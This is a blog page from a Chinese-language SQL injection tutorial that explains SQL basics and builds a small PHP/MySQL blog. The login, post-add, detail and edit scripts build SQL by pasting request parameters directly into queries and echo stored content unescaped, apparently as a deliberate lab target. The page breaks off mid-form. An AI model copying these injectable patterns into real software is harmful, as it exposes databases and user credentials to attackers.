<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="Charmersix">
    
    <title>
        
            Web_5_SQL注入 |
        
        Charmersix&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/logo.png">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"charmersix.icu","root":"/","language":"en","path":"search.json"}
    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/logo.png","favicon":"/images/logo.png","avatar":"/images/head.jpg","font_size":null,"font_family":null,"hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving.","font_color":null,"hitokoto":true},"scroll":{"progress_bar":false,"percent":true}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":true},"comment":{"enable":true,"use":"waline","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":"https://waline-charmersix.vercel.app/","reaction":true,"version":2}},"post":{"author_label":{"enable":false,"auto":false,"custom_label_list":["CTFer"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":false},"version":"3.6.1"}
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original article title","author":"Original article author","link":"Original article link"}
  </script>
<meta name="generator" content="Hexo 5.4.2"></head>


<body>
<div class="progress-bar-container">
    

    
        <span class="pjax-progress-bar"></span>
        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="/images/logo.png">
                </a>
            
            <a class="logo-title" href="/">
               Charmersix&#39;s Blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                HOME
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                ARCHIVES
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                TAGS
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/link"
                            >
                                LINKS
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                ABOUT
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">HOME</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">ARCHIVES</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">TAGS</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/link">LINKS</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">ABOUT</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    
<div class="fade-in-down-animation">
    <div class="page-template-container">
        
        
        <div class="page-template-content keep-markdown-body">
            
                <h2 id="第一节-SQL基础"><a href="#第一节-SQL基础" class="headerlink" title="第一节 SQL基础"></a>第一节 SQL基础</h2><h3 id="0x1-sql基本语法"><a href="#0x1-sql基本语法" class="headerlink" title="0x1 sql基本语法"></a>0x1 sql基本语法</h3><h4 id="sql作用"><a href="#sql作用" class="headerlink" title="sql作用"></a>sql作用</h4><p>curd 通过sql语句，和数据库交互，实现增删改查操作</p>
<h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>是一种软件，将数据以一定的格式保存在磁盘中，方便人们进行数据操作</p>
<p>数据库一般分为</p>
<ul>
<li>关系型数据库</li>
<li>非关系型数据库</li>
</ul>
<h5 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h5><p>采用了关系模型组织数据的数据库</p>
<p>二维模型可以简单理解为二维表格模型</p>
<p>常见的代表软件有：</p>
<ul>
<li><p>Oracle</p>
</li>
<li><p>MySQL</p>
<p>Maria DB 作为MySQL开源版本使用</p>
</li>
<li><p>SQL server</p>
<p>微软数据库软件，win中广泛使用</p>
</li>
<li><p>access</p>
<p>office产品数据库，后缀一般为mdb</p>
</li>
</ul>
<h5 id="非关系型数据库"><a href="#非关系型数据库" class="headerlink" title="非关系型数据库"></a>非关系型数据库</h5><p>也叫Nosql，泛指非关系型数据库</p>
<p>为了解决大规模数据集合多重数据种类带来的挑战，特别是大数据应用难题</p>
<p>典型代表</p>
<ul>
<li>Membase</li>
<li>MongoDB</li>
</ul>
<h4 id="数据库与SQL"><a href="#数据库与SQL" class="headerlink" title="数据库与SQL"></a>数据库与SQL</h4><h5 id="本地数据库"><a href="#本地数据库" class="headerlink" title="本地数据库"></a>本地数据库</h5><p>这里我们使用PHP study里面的MySQL，点击启动</p>
<h5 id="使用navicat建立数据库和数据表"><a href="#使用navicat建立数据库和数据表" class="headerlink" title="使用navicat建立数据库和数据表"></a>使用navicat建立数据库和数据表</h5><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210091402231.png" alt="image-20221009140249121"></p>
<p>我们在创建数据表时,可以将id设为键,然后递增</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210122143466.png" alt="image-20221012214332333"></p>
<p>这时候我们双击表格名字，就能看到它里面的数据，这些数据其实是软件帮我们执行了SQL语句后拿到的返回值填充到了可视化表格中</p>
<h5 id="使用SQL语句查询数据"><a href="#使用SQL语句查询数据" class="headerlink" title="使用SQL语句查询数据"></a>使用SQL语句查询数据</h5><p>打开命令行界面，执行我们第一个SQL语句</p>
<p><code>select id,username,password from user;</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210091411626.png" alt="image-20221009141108536"></p>
<h3 id="0x2-php操作数据库"><a href="#0x2-php操作数据库" class="headerlink" title="0x2 php操作数据库"></a>0x2 php操作数据库</h3><h4 id="php连接MySQL数据库"><a href="#php连接MySQL数据库" class="headerlink" title="php连接MySQL数据库"></a>php连接MySQL数据库</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="string">&quot;blog&quot;</span>;</span><br><span class="line"><span class="variable">$port</span> = <span class="string">&quot;3306&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$host</span>,<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$db</span>,<span class="variable">$port</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;connect_error)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;数据库连接异常&quot;</span>.<span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这时候我们访问<code>127.0.0.1/conn.php</code>.发现连接成功</p>
<h4 id="使用php建立登录界面"><a href="#使用php建立登录界面" class="headerlink" title="使用php建立登录界面"></a>使用php建立登录界面</h4><p>首先我们写一个登陆的前端页面</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Charmersix_blog系统登录<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Charmersix_blog系统登录<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;login.php&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">          账户:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">          密码:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登录&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>         </span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210091431722.png" alt="image-20221009143140691"></p>
<h4 id="建立登录验证功能"><a href="#建立登录验证功能" class="headerlink" title="建立登录验证功能"></a>建立登录验证功能</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;conn.php&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username from user where username = &#x27;<span class="subst">$username</span>&#x27; and password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>); <span class="comment">//sql语句传进去,和数据库交互</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_BOTH))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将交互结果反馈出来</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;登录成功,欢迎&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;LOGIN&#x27;</span>]=<span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">    &lt;a href=&quot;index.html&quot; style=&quot;color: tomato&quot;&gt;首页&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;a href=&quot;page_list.php&quot; style=&quot;color: tomato&quot;&gt;文章列表&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;a href=&quot;page_add.php&quot; style=&quot;color: tomato&quot;&gt;新增内容&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;a href=&quot;page_logout.php&quot; style=&quot;color: tomato&quot;&gt;退出登录&lt;/a&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;登录失败&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br></pre></td></tr></table></figure>

<h4 id="增加文章录入功能"><a href="#增加文章录入功能" class="headerlink" title="增加文章录入功能"></a>增加文章录入功能</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;conn.php&quot;;</span><br><span class="line"></span><br><span class="line">$title = $_POST[&#x27;title&#x27;];</span><br><span class="line">$content = $_POST[&#x27;content&#x27;];</span><br><span class="line">if(isset($title)&amp;&amp;isset($content))&#123;</span><br><span class="line">    //以免插入空内容</span><br><span class="line">    $sql = &quot;insert into page (title,content) values(&#x27;$title&#x27;,&#x27;$content&#x27;)&quot;;</span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    if($result)&#123;</span><br><span class="line">        echo &quot;插入成功&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;插入失败&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> $conn-&gt;close();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Charmersix_blog文章录入&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">      &lt;center&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">          &lt;h1&gt;Charmersix_blog文章录入&lt;/h1&gt;</span><br><span class="line">        &lt;hr&gt;</span><br><span class="line">        &lt;form action=&quot;login.php&quot; enctype=&quot;application/x-www-form-urlencoded&quot; method=&quot;post&quot;&gt;</span><br><span class="line">          账户:&lt;input type=&quot;text&quot; name=&quot;title&quot;&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">          密码:&lt;input type=&quot;text&quot; name=&quot;content&quot;&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">          &lt;br&gt;</span><br><span class="line">          &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;br&gt;&lt;br&gt;         </span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">      &lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="增加文章内容列表"><a href="#增加文章内容列表" class="headerlink" title="增加文章内容列表"></a>增加文章内容列表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;conn.php&quot;;</span><br><span class="line">$sql = &quot;select id,title,content from page&quot;;</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line">if ($result)&#123;</span><br><span class="line">    $list = $result-&gt;fetch_all(MYSQLI_BOTH);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Charmersix_blog内容列表&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">      &lt;center&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">         &lt;h1 style=&quot;color: #ffb8e5&quot;&gt;Charmersix_blog内容列表&lt;/h1&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">        foreach ($list as $p)&#123;</span><br><span class="line">        ?&gt;</span><br><span class="line">            &lt;li&gt;</span><br><span class="line">                &lt;a href=&quot;page_detail.php?id=&lt;?=$p[&#x27;id&#x27;]; ?&gt;&quot;&gt;</span><br><span class="line">                    &lt;?=$p[&#x27;title&#x27;]; ?&gt;</span><br><span class="line">                &lt;/a&gt;</span><br><span class="line">                &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br><span class="line">                &lt;a href=&quot;page_detail.php?id=&lt;?=$p[&#x27;id&#x27;]; ?&gt;&quot;&gt;查看&lt;/a&gt;</span><br><span class="line">                &lt;a href=&quot;page_edit.php?id=&lt;?=$p[&#x27;id&#x27;]; ?&gt;&quot;&gt; | 修改&lt;/a&gt;</span><br><span class="line">                &lt;a href=&quot;page_delete.php?id=&lt;?=$p[&#x27;id&#x27;]; ?&gt;&quot;&gt; | 删除&lt;/a&gt;</span><br><span class="line">            &lt;/li&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">        &#125;</span><br><span class="line">        ?&gt;</span><br><span class="line">     &lt;/ul&gt;</span><br><span class="line">      &lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="显示文章详情"><a href="#显示文章详情" class="headerlink" title="显示文章详情"></a>显示文章详情</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;conn.php&quot;;</span><br><span class="line">$id = $_GET[&#x27;id&#x27;]?$_GET[&#x27;id&#x27;]:1;</span><br><span class="line">$sql = &quot;select id,title,content from page where id = $id&quot;;</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line">if($result)&#123;</span><br><span class="line">    $page = $result-&gt;fetch_array(MYSQLI_BOTH);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;&lt;?=$page[&#x27;title&#x27;];?&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    &lt;h1 style=&quot;color: #ffb8e5&quot;&gt;&lt;?=$page[&#x27;title&#x27;];?&gt;&lt;/h1&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;p style=&quot;color: #ffb8e5&quot;&gt;</span><br><span class="line">        &lt;?=$page[&#x27;content&#x27;];?&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="增加文章编辑功能"><a href="#增加文章编辑功能" class="headerlink" title="增加文章编辑功能"></a>增加文章编辑功能</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;conn.php&quot;;</span><br><span class="line">$action = $_GET[&#x27;action&#x27;];</span><br><span class="line">if($action ==&quot;edit&quot;)&#123;</span><br><span class="line">    $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    $title = $_POST[&#x27;title&#x27;];</span><br><span class="line">    $content =$_POST[&#x27;content&#x27;];</span><br><span class="line"></span><br><span class="line">    $sql = &quot;update page set title = &#x27;$title&#x27;, content = &#x27;$content&#x27; where id =$id&quot;;</span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    if($result)&#123;</span><br><span class="line">        echo &quot;修改成功&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;修改失败&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    header(&quot;location:page_edit.php?id=$id&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    if(!isset($id))</span><br><span class="line">    &#123;</span><br><span class="line">        die(&quot;id不存在，不能修改&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $sql = &quot;select id,title,content from page where id=$id&quot;;</span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    if($result)&#123;</span><br><span class="line">        $page = $result-&gt;fetch_array(MYSQLI_BOTH);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Charmersix_blog内容修改&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    &lt;h1 style=&quot;color: #ffb8e5&quot;&gt;Charmersix_blog内容修改&lt;/h1&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;form action=&quot;page_edit.php?action=edit&amp;id=&lt;?=$page[&#x27;id&#x27;];?&gt;&quot; enctype=&quot;application/x-www-form-urlencoded&quot; method=&quot;post&quot; &gt;</span><br><span class="line"></span><br><span class="line">        标题:&lt;input type=&quot;text&quot; name=&quot;title&quot; style=&quot;background: rgba(255,255,255,0.5);color: rgba(255,255,255,1);width:200px&quot; 